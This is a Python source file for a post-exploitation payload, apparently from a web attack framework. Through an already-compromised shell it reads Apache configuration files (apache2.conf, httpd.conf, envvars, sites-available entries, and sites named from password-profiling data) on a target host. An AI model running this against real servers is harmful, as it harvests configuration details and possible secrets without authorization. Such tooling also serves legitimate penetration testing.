import re
import core.data.kb.knowledgeBase as kb
import plugins.attack.payloads.misc.file_crawler as file_crawler
from plugins.attack.payloads.base_payload import base_payload

class apache_config_files(base_payload):
    '''
    This payload finds readable Apache configuration files
    '''
    def api_read(self):
        result = {}
        result['apache_config'] = {}
        files = []

        files.append('apache2.conf')
        files.append('httpd.conf')
        files.append('magic')
        files.append('envvars')
        files.append('ports.conf')
        files.append('conf.d/security')
        files.append('sites-available/default')
        files.append('sites-available/default-ssl')
        files.append('conf.d/subversion.conf')

        apache_dir = self.exec_payload('apache_config_directory')
        if apache_dir:
            for dir in apache_dir:
                for file in files:
                    content = self.shell.read(dir+file)
                    if content:
                         result['apache_config'].update({dir+file:content})
                         
                        #result.append(file_crawler.get_files(self, self.shell.read(dir+file)))
                if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                    for profile in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                        profile_content = self.shell.read(dir+'sites-available/'+profile.lower())
                        if profile_content:
                             result['apache_config'].update({dir+'sites-available/'+profile.lower():profile_content})

        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        
        for k, v in hashmap.iteritems():
            k = k.replace('_', ' ')
            result.append(k.title())
            for file, content in v.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        
        if result == []:
            result.append('Apache configuration files not found.')
        return result

